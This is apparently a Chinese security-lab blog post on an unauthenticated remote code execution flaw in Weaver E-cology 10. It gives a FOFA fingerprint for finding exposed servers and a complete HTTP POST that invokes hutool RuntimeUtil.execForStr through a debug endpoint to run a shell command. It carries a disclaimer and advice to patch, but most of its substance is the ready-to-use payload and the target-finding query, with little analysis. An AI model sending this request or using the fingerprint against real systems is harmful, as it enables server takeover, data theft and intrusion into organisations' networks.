#  泛微 E-cology 10 未授权远程代码执行漏洞分析与安全风险解读  
原创 zz
                    zz  星络安全实验室   2026-03-24 12:30  
  
<table><tbody><tr style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><td data-colwidth="576" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;visibility: visible;"><section style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><span data-pm-slice="0 0 []" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgba(0, 0, 0, 0.9);font-family: &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: 0.544px;orphans: 2;text-align: justify;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;background-color: rgb(255, 255, 255);text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;float: none;visibility: visible;display: inline !important;"><span leaf="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;">免责声明:文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，未授权的攻击属于非法行为!文章中敏感信息均已做多层打码处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责作者不为此承担任何责任，一旦造成后果请自行负责</span></span></section></td></tr></tbody></table>  
fofa语法  
```
icon_hash="-1619753057"
```  
  
泛微 E-cology 10  
 是一款面向中大型组织的数智化协同运营平台，定位为企业级数字化中枢，核心功能涵盖协同办公、流程管理、业务集成、知识管理以及低代码开发等多种业务场景，广泛应用于企业信息化建设中。  
  
然而，安全研究表明，该系统存在严重的远程代码执行（RCE）漏洞。攻击者在**无需身份认证**  
的情况下，可通过向特定接口发送精心构造的恶意请求，在目标服务器上执行任意代码。  
  
一旦漏洞被成功利用，可能带来以下安全风险：  
- 服务器被完全控制，系统权限遭到接管  
  
- 企业敏感数据（如业务数据、用户信息等）被窃取或篡改  
  
- 系统被植入后门程序，形成长期潜伏风险  
  
- 内网环境进一步被横向渗透，扩大攻击影响范围  
  
该漏洞的存在对企业信息安全构成了严重威胁，建议相关用户及时关注官方安全公告，尽快进行漏洞修复与安全加固，同时加强访问控制与日志审计机制，以降低潜在风险。  
```
POST /papi/esearch/data/devops/dubboApi/debug/method?interfaceName=cn.hutool.core.util.RuntimeUtil&methodName=execForStr HTTP/1.1
Host: xx
Content-Type: application/json
Connection: close
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

[["whoami"]]
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AAMh9HmvsS6OOmYTTXV2KMB1JDxVrMdY1jeB5o7j5MAVTQV6uuIibMxkufHOH1otbTRdnWe0oFayD15uPljlNH2kr4rBpM8fY4A8ibkpvdU4/640?wx_fmt=png&from=appmsg "")  
  
  
